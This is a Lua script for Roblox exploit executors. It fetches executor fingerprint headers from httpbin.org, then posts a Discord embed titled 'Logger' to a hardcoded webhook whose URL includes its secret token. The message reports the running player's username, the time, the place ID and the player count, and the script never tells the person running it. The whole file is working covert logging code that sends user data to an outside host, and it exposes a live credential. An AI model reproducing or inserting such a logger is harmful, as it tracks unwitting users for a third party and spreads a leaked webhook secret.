function CreateWebHookMessage(MessageName, MessageValue, Color)
local http_request = http_request;
if syn then
http_request = syn.request
elseif SENTINEL_V2 then
function http_request(tb)
    return {
        StatusCode = 200;
        Body = request(tb.Url, tb.Method, (tb.Body or ''))
    }
end
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";
for i, v in next, hwid_list do
if decoded.headers[v] then
    hwid = decoded.headers[v];
    break
end
end
if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/1066696452539158588/ziGIABXkvERROkCVmPTRTWllYXZAIeaWjqjLwWZnl9sQEXGeEq0PQm_WsfkXwTwLvvNy"
local data = 
{
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "__**Logger**__",
        --["description"] = "**",
        ["type"] = "rich",
        ["color"] = Color,
        ["fields"] = {
            {
                ["name"] = MessageName,
                ["value"] = MessageValue,
                ["inline"] = true
            },
        },
    }}
}
local newdata = HttpServ:JSONEncode(data)
local headers = {
        ["content-type"] = "application/json"
}
local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
http_request(request_payload)
end
end

infoForMessage = game.PlaceId
serverForMessage = "missing"--game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild('Sidebar').Bin.ServerID.Text
TIMEcurrent = os.date"%H hour %M min %S sec (UTC+2)"

CreateWebHookMessage("Person: "..Game.Players.LocalPlayer.Name.." : "..TIMEcurrent, serverForMessage.." / MapID: "..infoForMessage.." / Total Players: "..tostring(#game.Players:GetPlayers()).."", 5377059)
